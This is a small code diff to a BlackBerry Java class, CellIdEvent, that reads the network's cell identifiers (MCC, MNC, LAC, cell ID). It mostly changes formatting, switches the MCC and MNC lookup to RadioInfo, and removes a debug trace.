@@ -20,7 +20,6 @@ import blackberry.Device;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
-
 /**
  * The Class CellIdEvent.
  */
@@ -63,22 +62,19 @@ public final class CellIdEvent extends Event {
      */
     protected void actualRun() {
         //final boolean gprs = Device.isGPRS();
-        int mcc=0, mnc=0, lac=0, cid=0;
+        int mcc = 0, mnc = 0, lac = 0, cid = 0;
 
         if (Device.isGPRS()) {
 
             final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
 
-            mcc = Integer.parseInt(Integer.toHexString(cellinfo.getMCC()));
-            mnc = cellinfo.getMNC();
+            mcc = Integer.parseInt(Integer.toHexString((RadioInfo
+                    .getMCC(RadioInfo.getCurrentNetworkIndex()))));
+            mnc = RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex());
+
             lac = cellinfo.getLAC();
             cid = cellinfo.getCellId();
-
-            final int newmcc = RadioInfo.getMCC(RadioInfo
-                    .getCurrentNetworkIndex());
-            //#ifdef DEBUG
-            debug.trace("actualRun mcc: " + newmcc);
-            //#endif
+            // bsic = cellinfo.getBSIC();
 
             final StringBuffer mb = new StringBuffer();
             mb.append("MCC: " + mcc);
@@ -89,7 +85,7 @@ public final class CellIdEvent extends Event {
             debug.info(mb.toString());
             //#endif
 
-        } else if(Device.isCDMA()) {
+        } else if (Device.isCDMA()) {
             final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
             //CDMAInfo.getIMSI()
             final int sid = cellinfo.getSID();
@@ -110,7 +106,7 @@ public final class CellIdEvent extends Event {
             mnc = sid;
             lac = nid;
             cid = bid;
-        }else if(Device.isIDEN()){
+        } else if (Device.isIDEN()) {
             //#ifdef DEBUG
             debug.error("actualRun: IDEN not supported");
             //#endif
